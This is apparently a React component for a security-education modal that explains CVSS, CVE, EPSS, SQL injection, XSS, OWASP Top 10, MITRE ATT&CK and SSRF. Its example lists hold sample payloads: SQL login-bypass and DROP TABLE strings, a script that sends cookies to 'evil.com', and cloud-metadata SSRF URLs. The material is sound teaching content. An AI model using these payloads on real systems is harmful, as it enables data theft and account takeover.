'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, ExternalLink, HelpCircle, ChevronRight } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { useUxStore } from '@/store/ux.store';

interface ConceptContent {
  title: string;
  emoji: string;
  tagline: string;
  eli5: string;
  analogy: string;
  technical: string;
  whyItMatters: string;
  examples: string[];
  relatedConcepts: string[];
  learnMoreUrl?: string;
}

const CONCEPTS: Record<string, ConceptContent> = {
  cvss: {
    title: 'CVSS Score',
    emoji: '📊',
    tagline: 'The standard way to measure how dangerous a vulnerability is',
    eli5: 'Imagine your home security system rates how serious each alarm is. A 10 means someone is breaking down your front door right now. A 1 means a window in the garage is slightly open. CVSS is the same thing for computer security problems — it scores them from 0 to 10 based on how bad they could be.',
    analogy: 'Like the Richter scale for earthquakes — a higher number means more damage potential.',
    technical: 'CVSS (Common Vulnerability Scoring System) is a standardized framework for rating the severity of security vulnerabilities. The v3.1 score is calculated from: Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction, Scope, and CIA Impact (Confidentiality, Integrity, Availability). Scores: 0.0=None, 0.1–3.9=Low, 4.0–6.9=Medium, 7.0–8.9=High, 9.0–10.0=Critical.',
    whyItMatters: 'Without a standardized scoring system, security teams would spend all their time arguing about which vulnerabilities are most important. CVSS gives everyone a common language and helps prioritize what to fix first.',
    examples: ['CVE-2021-44228 (Log4Shell): CVSS 10.0 — Critical (Remote code execution with no authentication needed)', 'A misconfigured cookie: CVSS 3.1 — Low (Minor information disclosure)', 'SQL injection in login page: CVSS 8.8 — High (Authentication bypass possible)'],
    relatedConcepts: ['cve', 'epss', 'vulnerability'],
  },
  cve: {
    title: 'CVE — Common Vulnerabilities and Exposures',
    emoji: '🏷️',
    tagline: 'The official ID system for security vulnerabilities',
    eli5: 'Imagine every car defect got a unique serial number like "Defect-2024-12345" so mechanics worldwide could quickly look it up. CVE does the same for software security bugs — each discovered vulnerability gets a unique ID so everyone can talk about the same exact issue.',
    analogy: 'Like a VIN (Vehicle Identification Number) for security vulnerabilities — unique, permanent, and universal.',
    technical: 'CVE (Common Vulnerabilities and Exposures) is a list of publicly disclosed cybersecurity vulnerabilities maintained by MITRE Corporation. Each entry has: CVE ID (CVE-YEAR-NUMBER), Description, References, and CVSS scores. The NVD (National Vulnerability Database) extends CVE with additional analysis.',
    whyItMatters: 'Without CVE IDs, two security teams might describe the same vulnerability completely differently, making it impossible to coordinate fixes and share information effectively. CVE creates a common language.',
    examples: ['CVE-2014-0160 (Heartbleed): Critical OpenSSL vulnerability', 'CVE-2021-44228 (Log4Shell): Critical Apache Log4j vulnerability', 'CVE-2017-0144 (EternalBlue): Used by WannaCry ransomware'],
    relatedConcepts: ['cvss', 'epss', 'patch-management'],
  },
  epss: {
    title: 'EPSS Score',
    emoji: '🎯',
    tagline: 'The probability that a vulnerability will be exploited in the next 30 days',
    eli5: 'If CVSS tells you how bad a vulnerability COULD be, EPSS tells you how likely it IS to be attacked. A vulnerability might be technically severe (high CVSS) but nobody has bothered to attack it. EPSS tells you which vulnerabilities attackers are actually targeting right now.',
    analogy: 'Like weather forecasting for cyberattacks — "There\'s an 80% chance this vulnerability will be exploited today."',
    technical: 'EPSS (Exploit Prediction Scoring System) is a ML model trained on threat intelligence data. It outputs a probability (0-1) that a CVE will be exploited in the next 30 days. High EPSS + High CVSS = Immediate action required. Low EPSS + High CVSS = Still fix it, but less urgently.',
    whyItMatters: 'Security teams have thousands of vulnerabilities to fix but limited resources. EPSS helps prioritize based on real-world attacker behavior, not just theoretical risk.',
    examples: ['EPSS 0.95, CVSS 9.8: Fix immediately — actively being exploited', 'EPSS 0.01, CVSS 9.0: Fix soon — severe but not currently targeted', 'EPSS 0.80, CVSS 5.0: Fix quickly — medium severity but highly targeted'],
    relatedConcepts: ['cvss', 'cve', 'vulnerability'],
  },
  'sql-injection': {
    title: 'SQL Injection',
    emoji: '💉',
    tagline: 'Tricking a database into revealing or deleting your data',
    eli5: 'Imagine you have a library catalog. When you search for "cats", it looks for books about cats. But what if someone types "cats; delete all books" and the system actually deletes all the books? That\'s SQL injection — tricking the system into doing something it wasn\'t supposed to.',
    analogy: 'Like adding hidden instructions to a grocery list — "Buy milk. Also, throw away all the food in the house."',
    technical: 'SQL injection occurs when user input is concatenated directly into SQL queries without sanitization. Attackers craft input containing SQL syntax to modify the query\'s logic. Types: In-band (Classic, Error-based), Inferential (Blind, Boolean-based, Time-based), Out-of-band. Impact: Authentication bypass, data extraction, data modification, command execution.',
    whyItMatters: 'SQL injection is consistently in OWASP Top 10 and has caused some of the largest data breaches in history. It can allow attackers to steal your entire database, including passwords and customer data.',
    examples: ['Username field: admin\' OR \'1\'=\'1 (bypasses login)', 'Search field: \'; DROP TABLE users; -- (deletes database)', 'ID parameter: 1 UNION SELECT username,password FROM users'],
    relatedConcepts: ['owasp-top10', 'xss', 'input-validation'],
  },
  xss: {
    title: 'Cross-Site Scripting (XSS)',
    emoji: '🎭',
    tagline: 'Injecting malicious code into webpages that others view',
    eli5: 'Imagine someone secretly replaced your office\'s welcome sign with one that says "Give me your wallet." That\'s XSS — an attacker hides malicious instructions on your website, and when other users visit, those instructions run on their computer (as if they came from your trusted site).',
    analogy: 'Like slipping a fake page into a trusted book at a library — readers trust the book, so they trust the fake page too.',
    technical: 'XSS allows attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users. Types: Reflected XSS (payload in request), Stored XSS (payload saved in database), DOM-based XSS (client-side manipulation). Impact: Cookie theft, session hijacking, keylogging, malware distribution, defacement.',
    whyItMatters: 'XSS attacks can steal users\' login sessions, redirect them to fake login pages to steal passwords, or silently execute actions on their behalf.',
    examples: ['Comment field: <script>document.location=\'evil.com/steal?c=\'+document.cookie</script>', 'Search box reflecting: <img src=x onerror=alert(1)>', 'Stored XSS in forum post stealing all users\' cookies'],
    relatedConcepts: ['sql-injection', 'csrf', 'csp'],
  },
  'owasp-top10': {
    title: 'OWASP Top 10',
    emoji: '🏆',
    tagline: 'The 10 most critical web application security risks',
    eli5: 'OWASP is like a safety organization for the internet. Every few years, they release a list of the 10 most common and dangerous ways websites get hacked. If you protect against these 10 things, you\'re much safer than most websites.',
    analogy: 'Like a "Top 10 Most Common Ways Homes Get Broken Into" list from a locksmiths association — knowing the most common attacks helps you protect against them.',
    technical: 'OWASP (Open Web Application Security Project) Top 10 (2021): A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable Components, A07 Authentication Failures, A08 Software/Data Integrity Failures, A09 Security Logging Failures, A10 SSRF.',
    whyItMatters: 'The OWASP Top 10 is referenced in regulations, compliance frameworks (PCI DSS, SOC 2), and is the basis for most web application security testing. Protecting against it covers the vast majority of real-world attacks.',
    examples: ['A01 Broken Access Control: Being able to access another user\'s account by changing a URL parameter', 'A03 Injection: SQL injection attacks', 'A07 Authentication Failures: Weak or missing password policies'],
    relatedConcepts: ['sql-injection', 'xss', 'csrf', 'ssrf'],
  },
  'mitre-attack': {
    title: 'MITRE ATT&CK Framework',
    emoji: '🗺️',
    tagline: 'A comprehensive map of how attackers think and operate',
    eli5: 'Imagine a detailed playbook that lists every move a burglar might make — case the building, pick the lock, disable the alarm, grab valuables, sneak out. MITRE ATT&CK is the same thing for hackers, showing exactly how they plan and execute cyberattacks.',
    analogy: 'Like a chess book that documents every possible move an opponent might make, organized by strategy.',
    technical: 'MITRE ATT&CK is a globally accessible knowledge base of adversary tactics and techniques. Structure: Tactics (WHY — Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Impact) → Techniques (HOW) → Sub-techniques (specific implementation).',
    whyItMatters: 'Understanding attacker methodology helps defenders build better protections and helps security teams detect attacks in progress. Many compliance frameworks and threat intelligence tools use ATT&CK for standardized communication.',
    examples: ['T1190: Exploit Public-Facing Application (using SQL injection to gain initial access)', 'T1078: Valid Accounts (using stolen credentials)', 'T1486: Data Encrypted for Impact (ransomware)'],
    relatedConcepts: ['cvss', 'threat-intelligence', 'penetration-testing'],
  },
  ssrf: {
    title: 'Server-Side Request Forgery (SSRF)',
    emoji: '🔄',
    tagline: 'Tricking your server into making requests on an attacker\'s behalf',
    eli5: 'Imagine you ask a receptionist to "fetch a document from this URL." Normally that\'s fine. But what if you give them the URL of your company\'s secret internal files? The receptionist has access to things you don\'t, so they\'ll bring back documents you shouldn\'t be able to see. SSRF is the same trick on web servers.',
    analogy: 'Like convincing a mail room employee to deliver a package to a restricted area of the building by making it look like an internal request.',
    technical: 'SSRF occurs when an application fetches a remote resource based on user-supplied input without proper validation. Attackers can make the server send requests to: Internal services (localhost, 169.254.169.254 for cloud metadata), Internal network resources, or External services using the server as a proxy.',
    whyItMatters: 'SSRF attacks on cloud environments can expose cloud provider metadata including IAM credentials, enabling full account takeover. It\'s in OWASP Top 10 and was used in the Capital One breach (2019).',
    examples: ['Fetching cloud metadata: http://169.254.169.254/latest/meta-data/', 'Accessing internal services: http://localhost:8080/admin', 'Port scanning internal network: http://10.0.0.1:22'],
    relatedConcepts: ['owasp-top10', 'cloud-security', 'api-security'],
  },
};

export function ConceptLearningModal(): JSX.Element {
  const { learningModalOpen, learningConcept, closeLearning, openLearning } = useUxStore();
  const [mode, setMode] = useState<'simple' | 'technical'>('simple');

  const concept = learningConcept ? CONCEPTS[learningConcept] : null;

  return (
    <AnimatePresence>
      {learningModalOpen && concept && (
        <>
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-background/80 backdrop-blur-sm"
            onClick={closeLearning}
          />

          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 20 }}
            className="fixed left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-50 w-full max-w-lg max-h-[85vh] overflow-y-auto"
          >
            <div className="bg-card border border-border rounded-2xl shadow-2xl overflow-hidden">
              {/* Header */}
              <div className="flex items-start justify-between p-5 border-b border-border bg-gradient-to-br from-primary/10 to-primary/5">
                <div className="flex items-center gap-3">
                  <span className="text-4xl">{concept.emoji}</span>
                  <div>
                    <p className="text-xs text-primary font-medium uppercase tracking-wider">Security Concept</p>
                    <h2 className="font-bold text-xl">{concept.title}</h2>
                    <p className="text-sm text-muted-foreground">{concept.tagline}</p>
                  </div>
                </div>
                <button onClick={closeLearning} className="p-1.5 hover:bg-muted rounded-lg transition-colors flex-shrink-0">
                  <X className="h-4 w-4" />
                </button>
              </div>

              <div className="p-5 space-y-4">
                {/* Mode toggle */}
                <div className="flex gap-2 p-1 bg-muted rounded-lg">
                  <button
                    onClick={() => setMode('simple')}
                    className={cn(
                      'flex-1 py-1.5 rounded-md text-sm font-medium transition-all',
                      mode === 'simple' ? 'bg-background shadow text-foreground' : 'text-muted-foreground',
                    )}
                  >
                    🧒 Simple Explanation
                  </button>
                  <button
                    onClick={() => setMode('technical')}
                    className={cn(
                      'flex-1 py-1.5 rounded-md text-sm font-medium transition-all',
                      mode === 'technical' ? 'bg-background shadow text-foreground' : 'text-muted-foreground',
                    )}
                  >
                    💻 Technical Details
                  </button>
                </div>

                {/* Content */}
                <AnimatePresence mode="wait">
                  {mode === 'simple' ? (
                    <motion.div key="simple" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                      <div className="p-4 bg-blue-500/10 border border-blue-500/20 rounded-xl">
                        <p className="text-xs font-semibold text-blue-400 mb-2">💡 Plain Language Explanation</p>
                        <p className="text-sm text-muted-foreground leading-relaxed">{concept.eli5}</p>
                      </div>
                      <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-xl">
                        <p className="text-xs font-semibold text-amber-400 mb-2">🔄 Real-World Analogy</p>
                        <p className="text-sm text-muted-foreground leading-relaxed">{concept.analogy}</p>
                      </div>
                    </motion.div>
                  ) : (
                    <motion.div key="technical" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                      <div className="p-4 bg-muted/50 rounded-xl">
                        <p className="text-xs font-semibold text-muted-foreground mb-2">Technical Overview</p>
                        <p className="text-sm text-muted-foreground leading-relaxed font-mono text-xs">{concept.technical}</p>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>

                {/* Why it matters */}
                <div className="p-4 bg-primary/5 border border-primary/20 rounded-xl">
                  <p className="text-xs font-semibold text-primary mb-2">⚡ Why This Matters to You</p>
                  <p className="text-sm text-muted-foreground">{concept.whyItMatters}</p>
                </div>

                {/* Examples */}
                {concept.examples.length > 0 && (
                  <div>
                    <p className="text-xs font-semibold text-muted-foreground mb-2">📚 Real Examples</p>
                    <ul className="space-y-2">
                      {concept.examples.map((example, i) => (
                        <li key={i} className="text-xs text-muted-foreground flex items-start gap-2 p-2 bg-muted/30 rounded-lg">
                          <span className="text-muted-foreground/60 flex-shrink-0">{i + 1}.</span>
                          {example}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {/* Related concepts */}
                {concept.relatedConcepts.length > 0 && (
                  <div>
                    <p className="text-xs font-semibold text-muted-foreground mb-2">🔗 Related Concepts</p>
                    <div className="flex flex-wrap gap-2">
                      {concept.relatedConcepts.map((related) => (
                        <button
                          key={related}
                          onClick={() => {
                            closeLearning();
                            setTimeout(() => openLearning(related), 200);
                          }}
                          className="text-xs px-2.5 py-1 bg-primary/10 text-primary rounded-full hover:bg-primary/20 transition-colors flex items-center gap-1"
                        >
                          {CONCEPTS[related]?.emoji} {CONCEPTS[related]?.title ?? related}
                          <ChevronRight className="h-3 w-3" />
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
}

// Helper function used in other components
function cn(...inputs: (string | boolean | undefined | null)[]): string {
  return inputs.filter(Boolean).join(' ');
}
